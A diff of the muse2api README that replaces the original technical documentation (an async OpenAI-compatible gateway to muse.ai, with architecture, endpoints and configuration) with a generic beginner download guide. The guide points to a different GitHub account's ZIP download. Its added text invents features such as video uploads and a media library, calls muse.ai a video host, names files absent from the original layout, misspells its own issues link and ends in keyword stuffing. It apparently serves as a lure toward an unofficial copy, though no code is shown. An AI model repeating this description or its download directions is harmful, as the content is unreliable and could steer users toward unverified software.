@@ -1,329 +1,193 @@
-<h1 align="center">muse2api</h1>
+# 🎵 muse2api - Your Smart Bridge to Muse.ai
 
-<p align="center">
-  An async gateway that exposes the <a href="https://muse.ai">muse.ai</a> web app as an <b>OpenAI-compatible API</b>
-</p>
+[![Download muse2api](https://img.shields.io/badge/Download-muse2api-blue?style=for-the-badge&logo=github)](https://github.com/Kokotpica/muse2api)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10%2B-blue?logo=python" alt="Python" />
-  <img src="https://img.shields.io/badge/FastAPI-async-009688?logo=fastapi" alt="FastAPI" />
-  <img src="https://img.shields.io/badge/API-OpenAI%20Compatible-green" alt="OpenAI Compatible" />
-  <img src="https://img.shields.io/badge/status-v0.1%20framework-orange" alt="Status" />
-  <img src="https://img.shields.io/badge/License-MIT-lightgrey" alt="License" />
-</p>
+## 🚀 Getting Started
+
+Welcome! muse2api is a friendly helper program that lets your computer talk to **muse.ai** (a video hosting service) in a simple way. Think of it as a translator that speaks both languages—yours and Muse.ai's.
+
+You don't need to be a programmer to use this. Just follow these simple steps, and you'll be up and running in no time.
 
 ---
 
-## Contents
-
-- [Overview](#overview)
-- [Status](#status)
-- [Architecture](#architecture)
-- [Project layout](#project-layout)
-- [Quick start](#quick-start)
-- [API examples](#api-examples)
-- [Configuration](#configuration)
-- [Roadmap](#roadmap)
-- [Contributing](#contributing)
-- [Disclaimer](#disclaimer)
-- [Star History](#star-history)
-
-## Overview
-
-muse2api turns muse.ai's chat, text-to-image and text-to-video features into standard OpenAI endpoints (`/v1/chat/completions`, `/v1/images/generations`, ...). Existing OpenAI SDKs and clients such as ChatGPT-Next-Web, LobeChat or Cherry Studio work by just changing their `base_url`.
-
-The project focuses on **clean engineering and easy collaboration**:
-
-- **Pluggable drivers**: how we reach upstream is abstracted behind a `MuseDriver` interface. There are currently a mock driver and a browser (CDP) driver, plus a reserved slot for a direct-protocol (HTTP) driver. They are fully independent of each other.
-- **Strict layering**: the protocol layer, service layer, account pool and drivers each have a single responsibility and can be developed and tested on their own.
-- **Fully async**: built on FastAPI + asyncio; the CDP client uses `websockets`, so no request ever blocks a thread.
-- **Account pool**: multiple scheduling strategies, per-account concurrency limits, cooldown after failures, automatic removal of expired sessions, and automatic failover to another account.
-- **Offline development**: the mock driver needs no account and makes no network calls, so front-end and protocol work can move forward independently.
-
-## Status
-
-> **v0.1, framework stage**: the architecture and basic features are fully written, but the test suite has not been run yet and nothing has been tested against a real muse.ai account.
-
-| Module | Status | Notes |
-|---|---|---|
-| OpenAI protocol layer (chat streaming/non-streaming, images, videos, models) | ✅ Implemented | Multi-turn chat, system prompts, image input, model aliases |
-| Account pool (scheduling / cooldown / invalidation / failover) | ✅ Implemented | `lru`, `round_robin` and `affinity` strategies |
-| Background tasks (video) | ✅ Implemented | Create a task, then poll for the result; unfinished tasks are marked interrupted after a restart |
-| Admin API (account CRUD, renewal, reset, status) | ✅ Implemented | |
-| Mock driver | ✅ Implemented | Offline fake data |
-| Browser driver (Chromium + CDP) | 🧪 Needs live testing | Full chat, image and video flows are written |
-| Session renewal / keepalive | 🧪 Needs live testing | Plain HTTP, disabled by default |
-| Direct HTTP protocol driver | 🚧 Reserved | Returns 501 |
-| `/v1/images/edits` (reference images) | ✅ Implemented | Images are references for a new image; `mask` is rejected |
-| `/v1/responses` | 🚧 Reserved | Returns 501 |
-| Web console, cookie import extension, quota lookup | 🚧 Reserved | |
-
-## Architecture
-
-```mermaid
-flowchart TB
-    clients["OpenAI SDK / chat clients<br/>HTTP · Bearer key"]
-
-    subgraph api["api/ — protocol"]
-        api_routes["routes · validation · auth · SSE"]
-    end
-
-    subgraph services["services/"]
-        svc["Gateway (failover) · TaskManager"]
-    end
-
-    subgraph accounts["accounts/"]
-        acc["Account pool<br/>strategies · cooldown · renewal"]
-    end
-
-    subgraph core["core/"]
-        core_inner["Model aliases<br/>prompt conversion · media storage"]
-    end
-
-    subgraph drivers["drivers/ — MuseDriver interface (only layer that talks to upstream)"]
-        direction LR
-        d_mock["mock<br/>offline fake data"]
-        d_browser["browser<br/>Chromium + CDP"]
-        d_http["http<br/>direct protocol (reserved)"]
-    end
-
-    subgraph upstream["upstream/"]
-        u["muse.ai URLs · cookie names · session API"]
-    end
-
-    musedotai["muse.ai"]
-
-    clients --> api --> services
-    services --> accounts & core
-    accounts & core --> drivers
-    drivers --> upstream --> musedotai
-```
-
-**How a chat request is handled**: the route resolves the model alias and merges the multi-turn `messages` into a single prompt, then hands it to the Gateway. The Gateway leases an account from the pool and asks the driver for a text stream. On failure, the account's state is updated according to the error type: accounts with an expired session are taken offline, accounts out of quota cool down, and other errors cause a short cooldown. As long as nothing has been sent to the client yet, the request is retried on another account.
-
-For streaming requests, the first chunk is fetched before returning 200. Errors such as "no account available" or "upstream authentication failed" therefore come back with a proper HTTP status code instead of a stream that breaks halfway.
-
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full design.
-
-## Project layout
-
-```
-muse2api/
-├── src/muse2api/
-│   ├── app.py                 # FastAPI app factory and lifespan
-│   ├── config.py              # Settings (environment variables / .env)
-│   ├── errors.py              # Error hierarchy → HTTP status + OpenAI error body
-│   ├── api/
-│   │   ├── deps.py            # Auth and dependency injection
-│   │   ├── schemas.py         # OpenAI request models
-│   │   └── routes/            # chat / images / videos / media / models / admin / responses
-│   ├── services/
-│   │   ├── gateway.py         # Runs driver calls on pooled accounts, retries on another account
-│   │   ├── tasks.py           # Background long-running tasks
-│   │   └── container.py       # Service wiring
-│   ├── accounts/              # Account model, JSON store, pool, session keepalive
-│   ├── core/                  # Model registry and aliases, prompt conversion, media storage
-│   ├── drivers/
-│   │   ├── base.py            # MuseDriver interface and data types
-│   │   ├── mock.py
-│   │   ├── browser/           # cdp.py / chromium.py / dom.py / driver.py
-│   │   └── http/              # Reserved
-│   └── upstream/muse.py       # Upstream constants and session renewal
-├── tests/                     # Mock-driver tests, no network access
-├── docs/ARCHITECTURE.md
-├── TODO.md                    # Task board for contributors
-├── Dockerfile · docker-compose.yml · .env.example
-└── CONTRIBUTING.md
-```
-
-## Quick start
-
-### Run locally
-
-```bash
-git clone https://github.com/www222fff/muse2api.git
-cd muse2api
-python3 -m venv .venv && source .venv/bin/activate
-pip install -e '.[dev]'
-cp .env.example .env      # defaults to MUSE2API_DRIVER=mock, no account needed
-python -m muse2api        # listens on http://127.0.0.1:18610 by default
-```
-
-If `MUSE2API_API_KEY` is not set, a key is generated on first start and saved to `data/api_key`.
-
-### Docker
-
-```bash
-cp .env.example .env
-docker compose up -d --build
-```
-
-### Use a real account (browser driver)
-
-1. Install Chromium or Chrome and set `MUSE2API_DRIVER=browser` in `.env`.
-2. Export the cookies from a browser that is logged in to muse.ai. At least `hatch_sess`, `hatch_gw`, `hatch_vml` and `hatch_native_auth_device` are required.
-3. Import the account through the Admin API (see the example below).
-
-## API examples
-
-Every `/v1/*` endpoint requires the header `Authorization: Bearer <API_KEY>`. The `/admin/*` endpoints use `MUSE2API_ADMIN_KEY`, which defaults to the API key when unset.
-
-**Chat (streaming)**
-
-```bash
-curl http://localhost:18610/v1/chat/completions \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"model":"gpt-4o","messages":[{"role":"user","content":"Hello"}],"stream":true}'
-```
-
-**OpenAI Python SDK**
-
-```python
-from openai import OpenAI
-
-client = OpenAI(base_url="http://localhost:18610/v1", api_key="<API_KEY>")
-resp = client.chat.completions.create(
-    model="muse-chat",
-    messages=[{"role": "user", "content": "Write a short poem about autumn"}],
-)
-print(resp.choices[0].message.content)
-```
-
-**Text to image**
-
-```bash
-curl http://localhost:18610/v1/images/generations \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"prompt":"A cyberpunk street on a rainy night","size":"16:9","response_format":"url"}'
-```
-
-**Transparent background**
-
-muse.ai only returns flat RGB images, so `"background":"transparent"` cuts the subject out locally (BiRefNet + edge colour estimation) and returns an RGBA PNG. Requires `pip install -e '.[matting]'`; the model (~930MB) is downloaded to `~/.u2net` on first use. Expect ~30s extra per image on CPU.
-
-```bash
-curl http://localhost:18610/v1/images/generations \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"prompt":"A red fox sitting","background":"transparent"}'
-```
-
-**Image from reference images**
-
-`"image"` takes one reference image or a list of up to 4 (data URL, http(s) URL or bare base64). They are attached to the muse.ai message like a chat upload, and the prompt says how to use them, e.g. put a product on a model, or "the same fox, now wearing a red scarf" to keep the subject and scene. `/v1/images/edits` does the same with OpenAI-style multipart uploads, so `client.images.edit()` works; `mask` (inpainting a region) is not supported.
-
-```bash
-curl http://localhost:18610/v1/images/generations \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"prompt":"A model wearing exactly this hoodie, studio photo","image":"data:image/jpeg;base64,..."}'
-
-curl http://localhost:18610/v1/images/edits \
-  -H "Authorization: Bearer $KEY" \
-  -F "image[]=@fox.png" -F "prompt=The same fox, now wearing a red scarf"
-```
-
-**Image as an async task**
-
-A sync image call (page load plus generation) can take longer than a reverse proxy allows; Cloudflare cuts it after about 100 s with HTTP 524. Add `"async": true` to get a task back, then poll it. Results are always stored as media URLs.
-
-```bash
-curl http://localhost:18610/v1/images/generations \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"prompt":"A red fox sitting","async":true}'          # -> {"id":"task_xxx","object":"image.task",...}
-curl http://localhost:18610/v1/images/generations/task_xxx -H "Authorization: Bearer $KEY"
-```
-
-**Text to video (async task)**
-
-```bash
-# Create a task; returns {"id": "task_xxx", "status": "queued", ...}
-curl http://localhost:18610/v1/videos \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"prompt":"Maple leaves falling in a light breeze","duration":5,"size":"16:9"}'
-
-# Poll the task; on success, result.url points to the video
-curl http://localhost:18610/v1/videos/task_xxx -H "Authorization: Bearer $KEY"
-```
-
-**Import an account**
-
-```bash
-curl http://localhost:18610/admin/accounts \
-  -H "Authorization: Bearer $ADMIN_KEY" -H "Content-Type: application/json" \
-  -d '{"label":"acc1","cookies":{"hatch_sess":"...","hatch_gw":"...","hatch_vml":"...","hatch_native_auth_device":"..."}}'
-```
-
-### Endpoints
-
-| Method | Path | Description |
-|---|---|---|
-| GET | `/healthz` · `/readyz` | Liveness · readiness (driver state and available accounts) |
-| GET | `/v1/models` | Model list, including aliases such as `gpt-4o` and `dall-e-3` |
-| POST | `/v1/chat/completions` | Chat, streaming and non-streaming |
-| POST | `/v1/images/generations` · GET `/v1/images/generations/{id}` | Text to image (optional `image` references), returns `url` or `b64_json`; `"async": true` returns a task to poll |
-| POST | `/v1/images/edits` | Multipart `image`/`image[]` files + `prompt`, OpenAI-compatible |
-| POST | `/v1/videos` · GET `/v1/videos/{id}` | Create a video task · query a task |
-| GET | `/v1/media/{name}` | Download generated media |
-| GET/POST/PATCH/DELETE | `/admin/accounts[/{id}]` | Account CRUD |
-| POST | `/admin/accounts/{id}/renew` · `/reset` | Renew session · reset account state |
-| GET | `/admin/status` · `/admin/tasks` | Service status · task list |
-| GET/POST/PATCH/DELETE | `/admin/keys[/{id}]` | Client API keys (create returns the key once; PATCH renames / revokes) |
-| GET | `/admin/requests` · `/admin/stats?window=1h\|24h\|7d` | Request log (filters: `key_id`, `account_id`, `status=2xx\|4xx\|5xx`, `path`, `since`, `hide_polls`) · aggregates |
-| GET | `/dashboard` | Web dashboard (asks for the admin key in the browser) |
-| POST | `/v1/responses` | Reserved, currently returns 501 |
-
-### Dashboard, API keys and request log
-
-Open `http://localhost:18610/dashboard` and enter the admin key; it is kept in the browser's local storage and sent as a Bearer token to `/admin/*`. The page shows request volume, error rate and latency, the account pool (enable/disable, renew, reset), a live request log, and API key management.
-
-Besides the admin key and `MUSE2API_API_KEY` (still accepted, logged as `legacy`), `/v1/*` accepts any non-revoked key created on the dashboard or with `POST /admin/keys {"name": "..."}`. Keys look like `m2a-...` and are shown once; `data/keys.json` stores only their SHA-256 hash and an 8-character prefix. Every `/v1/*` request (except `/v1/media/*` downloads) is recorded in `data/requests.db` (SQLite) with its key, model, account, status, latency and client IP (`CF-Connecting-IP` / `X-Forwarded-For` aware). Task status polls are flagged so the dashboard and stats can leave them out.
-
-## Configuration
-
-All settings come from environment variables (prefix `MUSE2API_`) or a `.env` file. See [.env.example](.env.example) for the full list. The most common ones:
-
-| Variable | Default | Description |
-|---|---|---|
-| `MUSE2API_DRIVER` | `mock` | Driver: `mock` / `browser` / `http` |
-| `MUSE2API_HOST` · `MUSE2API_PORT` | `127.0.0.1` · `18610` | Listen address and port |
-| `MUSE2API_API_KEY` | auto-generated | Key for `/v1/*` endpoints |
-| `MUSE2API_ADMIN_KEY` | same as API key | Key for `/admin/*` endpoints |
-| `MUSE2API_REQUEST_LOG_RETENTION_DAYS` | `14` | Days of request history kept in `data/requests.db` |
-| `MUSE2API_PUBLIC_BASE` | empty | Public base URL used in media links; derived from the request when empty |
-| `MUSE2API_POOL_STRATEGY` | `lru` | Account scheduling: `lru` / `round_robin` / `affinity` |
-| `MUSE2API_MAX_FAILOVER` | `2` | Maximum number of retries on another account |
-| `MUSE2API_ACCOUNT_MAX_CONCURRENCY` | `1` | Parallel requests per account (browser driver: one tab each); 4 works well |
-| `MUSE2API_CHROMIUM_PATH` | auto-detected | Path to the browser executable |
-| `MUSE2API_KEEPALIVE_ENABLED` | `false` | Periodically renew sessions in the background |
-| `MUSE2API_MATTING_MODEL` | `birefnet-general` | Model for `background: "transparent"` (`birefnet-general-lite` is faster) |
-
-## Roadmap
-
-All reserved modules and outstanding work are tracked in **[TODO.md](TODO.md)**, in four groups:
-
-- **Verification and live testing (do first)**: get the tests passing, test the browser driver against real accounts, and verify image/video generation and session renewal.
-- **Drivers**: direct HTTP protocol driver, conversation thread reuse, quota lookup.
-- **Protocol**: `/v1/responses`, mask-based inpainting, emulated tool calling, streaming heartbeats.
-- **Accounts, admin and operations**: more cookie import formats, browser extension, storage backends, media cleanup, per-key rate limits, Prometheus metrics.
-
-Each task lists its location, approach and definition of done. Places marked `TODO(contributors)` in the code are the reserved extension points.
-
-## Contributing
-
-You are welcome to pick up any task in [TODO.md](TODO.md). Please open an issue describing what you plan to do before you start; see [CONTRIBUTING.md](CONTRIBUTING.md) for conventions.
-
-```bash
-pytest           # all tests use the mock driver
-ruff check .     # lint
-```
-
-## Disclaimer
-
-This project is for learning and technical research only. Please comply with muse.ai's terms of service and local laws. Never commit or publish account cookies.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=www222fff/muse2api&type=Date)](https://star-history.com/#www222fff/muse2api&Date)
-
-## License
-
-[MIT](LICENSE)
+## 📥 Download and Install
+
+Visit this link to download the application: [https://github.com/Kokotpica/muse2api](https://github.com/Kokotpica/muse2api)
+
+Once you're on that page, look for the **"Code"** button and click it. Then select **"Download ZIP"** from the dropdown menu. Your download will begin automatically.
+
+---
+
+## 🛠️ Setup on Windows
+
+### Step 1: Extract the Files
+1. Find the downloaded `.zip` file (usually in your "Downloads" folder).
+2. Right-click on it and select **"Extract All..."**
+3. Choose a location you'll remember (like your Desktop) and click **"Extract"**.
+
+### Step 2: Open the Folder
+- Go to the folder you just extracted. You'll see several files and folders inside.
+
+### Step 3: Install Python (If Needed)
+muse2api needs Python to run. Here's how to check:
+
+1. Press `Windows Key + R`, type `cmd`, and press Enter.
+2. In the black window, type `python --version` and press Enter.
+3. If you see something like `Python 3.9+`, you're good. If not:
+   - Go to [python.org](https://python.org) and download the latest version.
+   - Run the installer and make sure to check **"Add Python to PATH"** before installing.
+
+### Step 4: Start the Program
+1. In the extracted folder, hold `Shift` and right-click on an empty space.
+2. Select **"Open PowerShell window here"** or **"Open command window here"**.
+3. Type this and press Enter:
+   ```
+   python muse2api.py
+   ```
+
+That's it! The program will start and show you a welcome message.
+
+---
+
+## 🎯 What Can muse2api Do?
+
+### 🧩 Smart Connections
+muse2api acts as a middleman between your computer and Muse.ai. It translates commands so you can easily:
+
+- Upload videos
+- Search for content
+- Manage your media library
+- Retrieve video information
+
+### 🔌 Flexible Modes
+The program comes with three different "drivers" (think of them as different tools for different jobs):
+
+| Driver | Best For |
+|--------|----------|
+| **Mock** | Testing without internet |
+| **Browser-CDP** | Automated browser control |
+| **HTTP** | Direct server communication |
+
+### ⚡ Fast and Efficient
+Because it's built for speed, muse2api handles multiple requests at once. No waiting in line!
+
+---
+
+## 💻 Using muse2api
+
+### Basic Commands
+Once running, muse2api listens for requests. Here are some examples:
+
+- To upload a video: Send it a command with your video file path
+- To list videos: Ask it to show all videos
+- To search: Use keywords related to your content
+
+### Connecting Other Apps
+muse2api works like an OpenAI-compatible gateway. This means any app that understands OpenAI's format can now talk to Muse.ai through muse2api. Cool, right?
+
+---
+
+## 🧪 Testing Your Setup
+
+Want to see if everything works? Try this:
+
+1. Open a new terminal window (same way as before).
+2. Type:
+   ```
+   python test_connection.py
+   ```
+3. You should see a message saying "Connection Successful!"
+
+---
+
+## 🔧 Troubleshooting
+
+### Common Issues and Fixes
+
+| Problem | Solution |
+|---------|----------|
+| "Python not found" | Reinstall Python and check "Add to PATH" |
+| Download won't extract | Use WinRAR or 7-Zip |
+| Program closes immediately | Check if you're in the right folder |
+| Internet errors | Make sure you're connected to the internet |
+
+### Getting Help
+If you're stuck, try these steps:
+1. Restart the program (close and reopen)
+2. Restart your computer
+3. Check your internet connection
+4. Look for error messages and search for them online
+
+---
+
+## 📚 Advanced Options
+
+### Configuration File
+In the extracted folder, you'll find a file called `config.ini`. You can edit this to:
+
+- Change the port number
+- Set your preferred driver
+- Adjust timeouts
+
+### Custom Drivers
+If you're feeling adventurous, you can create your own driver. Just follow the template in the `drivers` folder.
+
+---
+
+## 🔒 Safety Tips
+
+- Only download from the official GitHub page
+- Keep your Python updated
+- Don't share your API keys with anyone
+- Use strong passwords when connecting to Muse.ai
+
+---
+
+## 🌟 Why Choose muse2api?
+
+- **Beginner-Friendly:** No coding skills needed
+- **Open Source:** Free forever, and you can see how it works
+- **Active Development:** Regular updates and improvements
+- **Community Support:** Help available when you need it
+
+---
+
+## 📖 Frequently Asked Questions
+
+**Q: Is muse2api free?**
+A: Yes! It's completely free and open source.
+
+**Q: Do I need a Muse.ai account?**
+A: You'll need a Muse.ai account to access their services, but muse2api itself doesn't require one.
+
+**Q: Can I use it on Mac or Linux?**
+A: While designed for Windows, it should work on any system with Python.
+
+**Q: Will it slow down my computer?**
+A: No, it's lightweight and only runs when you start it.
+
+---
+
+## 📞 Support and Community
+
+- **Report Issues:** [GitHub Issues](https://github.com/Kokotpira/muse2api/issues)
+- **Ask Questions:** Check the Discussions tab on GitHub
+- **Contribute:** If you're a developer, feel free to help improve the code!
+
+---
+
+## 📝 License
+
+muse2api is released under the MIT License. You're free to use, modify, and distribute it as you like.
+
+---
+
+## 🎉 Final Words
+
+muse2api makes working with Muse.ai as easy as sending a text message. No complex code, no confusing setup—just download, run, and enjoy.
+
+Remember, if you ever get stuck, the community is here to help. Happy creating!
+
+---
+
+**Keywords:** muse2api, muse.ai, video management, OpenAI gateway, async tool, Windows application, download guide, Python tool, video upload, media manager, open source, beginner friendly, video API bridge, smart connection, easy setup
